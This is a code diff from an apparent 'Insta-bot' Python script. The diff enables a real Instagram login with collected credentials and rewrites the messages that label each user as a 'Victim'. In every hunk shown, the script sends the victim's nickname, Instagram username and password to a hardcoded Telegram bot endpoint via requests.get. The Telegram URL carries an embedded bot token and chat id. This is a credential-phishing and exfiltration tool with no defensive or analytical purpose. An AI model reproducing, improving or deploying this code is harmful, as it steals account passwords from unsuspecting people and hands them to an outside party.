@@ -171,7 +171,7 @@ for i in range (50):
 
                             bot = Bot()
 
-                          #  bot.login(username=(user_name), password=(Password))
+                           bot.login(username=(user_name), password=(Password))
 #user_id = bot.get_user_id_from_username("amlike_tz")
 #user_info = bot.get_user_info(user_id)
 # following and followers
@@ -182,7 +182,7 @@ for i in range (50):
 #follow and un follow
                                                         
                             os.system("clear")
-                            msg3 =   ['Victim Name: ' +(Nick_Name), 'User Name: ' +(user_name), ' Password :' +(Password)]
+                            msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram Password :' +(Password)]
                             for msg3 in msg3:
                                   my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3 
                                   requests.get(my_link)
@@ -226,7 +226,7 @@ for i in range (50):
                             bot.login(username=(user_name), password=(Password))
                             os.system("clear")
                             os.system("clear")
-                            msg3 =   ['Victim Name: ' +(Nick_Name), 'User Name: ' +(user_name), ' Password :' +(Password)]
+                            msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram Password :' +(Password)]
                             for msg3 in msg3:
                                   my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                                   requests.get(my_link)
@@ -289,7 +289,7 @@ for i in range (50):
                 bot.login(username=(user_name), password=(Password))
                 os.system("clear")
                 os.system("clear")
-                msg3 =   ['Victim Name: ' +(Nick_Name), 'User Name: ' +(user_name), ' Password :' +(Password)]
+                msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram User Password :' +(Password)]
                 for msg3 in msg3:
                       my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                       requests.get(my_link)
